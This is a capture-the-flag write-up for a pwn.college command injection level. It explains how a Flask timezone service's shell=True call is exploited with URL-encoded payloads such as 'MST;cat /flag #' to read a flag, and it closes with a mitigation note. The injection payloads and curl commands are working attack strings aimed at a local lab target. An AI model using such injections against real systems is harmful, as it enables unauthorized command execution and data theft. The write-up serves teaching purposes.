Lab: Command Injection 4

Platform: pwn.college
Category: Web Security → Command Injection

Description

This level contains a timezone service. The application takes a timezone supplied by the user and passes it directly into a Linux shell command.

The goal is to exploit this command injection vulnerability to execute an unintended command and retrieve the flag.

Steps
1. Go to the challenge directory
cd /challenge

This moves us into the directory containing the challenge files.

2. Read the server code
cat server

The important part of the server is:

arg = flask.request.args.get("tzone", "MST")
command = f"TZ={arg} date"

The user controls the tzone parameter.

For example, if we send:

tzone=EST

then:

arg = "EST"

and the application creates:

TZ=EST date
3. Understand how the command is executed

The application then runs:

result = subprocess.run(
    command,
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    encoding="latin",
).stdout

The important part is:

shell=True

This means the command is interpreted by the Linux shell.

Therefore, shell metacharacters such as:

;
&
|
$
`
#

can have special meaning.

Because arg is inserted directly into the command, we can potentially inject another command.

4. Start the server

Run:

/challenge/server

The server starts on:

http://challenge.localhost:80

Keep this terminal running.

5. Test the timezone service normally

Open another terminal and run:

curl "http://challenge.localhost/stage?tzone=EST"

The server constructs:

TZ=EST date

and returns the current time using the EST timezone.

The important thing is that our input appears directly inside the command.

6. Understand the command injection

The normal command is:

TZ=EST date

Now suppose we provide:

EST;whoami

The server constructs:

TZ=EST;whoami date

The ; tells the shell:

End the first command and start another command.

Therefore, the shell executes:

TZ=EST

and then:

whoami date

This demonstrates that we can influence the shell beyond the intended TZ value.

7. URL-encode the command separator

When sending special characters through a URL, we can URL-encode them.

The semicolon is:

;

and its URL-encoded representation is:

%3B

So we can test:

curl "http://challenge.localhost/stage?tzone=MST%3Bwhoami"

The web server decodes the URL parameter to approximately:

MST;whoami

The Python application therefore constructs:

TZ=MST;whoami date

This confirms that our input is being interpreted by the shell.

8. Inject a command to read the flag

The goal is to execute:

cat /flag

We can inject it after the semicolon.

The space character can be URL-encoded as:

%20

Therefore:

curl "http://challenge.localhost/stage?tzone=MST%3Bcat%20/flag"

is decoded approximately as:

MST;cat /flag

The application constructs:

TZ=MST;cat /flag date

The shell interprets the semicolon as a command separator.

9. Use # to remove the remaining command

There is a small problem with the previous payload.

The application automatically adds:

date

after our input.

So we can use the shell comment character:

#

Everything after # on that shell command line is ignored.

URL encoding for # is:

%23

Therefore, the final payload is:

curl "http://challenge.localhost/stage?tzone=MST%3Bcat%20/flag%20%23"

The decoded input is:

MST;cat /flag #

The application constructs:

TZ=MST;cat /flag # date

The shell effectively executes:

TZ=MST

followed by:

cat /flag

The final:

# date

is treated as a comment and isn't executed.

Why the attack works

The original application expects:

tzone=MST

and intends to create:

TZ=MST date

But we supply:

MST;cat /flag #

which causes the application to create:

TZ=MST;cat /flag # date

The shell interprets this as two commands:

TZ=MST

and:

cat /flag

The second command was never intended by the developer.

URL Encoding Used
Character	URL encoding	Purpose
;	%3B	Separates shell commands
space	%20	Separates command arguments
#	%23	Comments out the remaining command

So:

MST;cat /flag #

becomes:

MST%3Bcat%20/flag%20%23
Final Command
curl "http://challenge.localhost/stage?tzone=MST%3Bcat%20/flag%20%23"
Vulnerable code
arg = flask.request.args.get("tzone", "MST")
command = f"TZ={arg} date"

subprocess.run(
    command,
    shell=True,
    ...
)
Core vulnerability
User input
    ↓
tzone=MST;cat /flag #
    ↓
Python string formatting
    ↓
TZ=MST;cat /flag # date
    ↓
shell=True
    ↓
Shell interprets ;
    ↓
cat /flag
    ↓
FLAG
Conclusion

The vulnerability occurs because untrusted user input is directly inserted into a shell command and executed with shell=True.

The key lesson is that shell metacharacters such as ; are not ordinary characters when the input reaches a shell. A safer implementation would avoid constructing a shell command string and instead pass arguments directly to subprocess.run() without shell=True.
